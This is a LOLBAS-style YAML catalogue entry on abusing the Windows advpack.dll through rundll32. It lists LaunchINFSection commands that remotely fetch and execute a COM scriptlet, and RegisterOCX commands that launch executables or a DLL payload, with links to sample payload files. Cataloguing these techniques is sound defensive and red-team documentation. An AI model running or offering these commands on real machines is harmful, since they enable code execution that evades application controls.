---
Name: Advpack.dll
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,
    Description: Remote fetch and execute a COM Scriptlet by calling an information file directive (Section name specified).
  - Command: rundll32.exe advpack.dll,LaunchINFSection test.inf,,1,
    Description: Remote fetch and execute a COM Scriptlet by calling an information file directive (DefaultInstall section implied).
  - Command: rundll32.exe Advpack.dll,RegisterOCX calc.exe
    Description: Launch executable by calling the RegisterOCX function.
  - Command: rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"
    Description: Launch executable by calling the RegisterOCX function.
  - Command: rundll32.exe Advpack.dll,RegisterOCX test.dll
    Description: Launch a DLL payload by calling the RegisterOCX function.
Full Path:
  - c:\windows\system32\advpack.dll
  - c:\windows\sysWOW64\advpack.dll
Code Sample:
  - https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSLibraries/Payload/Advpack.inf
  - https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSLibraries/Payload/Advpack_calc.sct
Detection: []
Resources:
  - https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
  - https://twitter.com/ItsReallyNick/status/967859147977850880
  - https://twitter.com/bohops/status/974497123101179904
  - https://twitter.com/moriarty_meng/status/977848311603380224
Notes: Thanks to Jimmy - @bohops (LaunchINFSection), fabrizio - @0rbz_ (RegisterOCX - DLL), Moriarty @moriarty_meng (RegisterOCX - Cmd)
---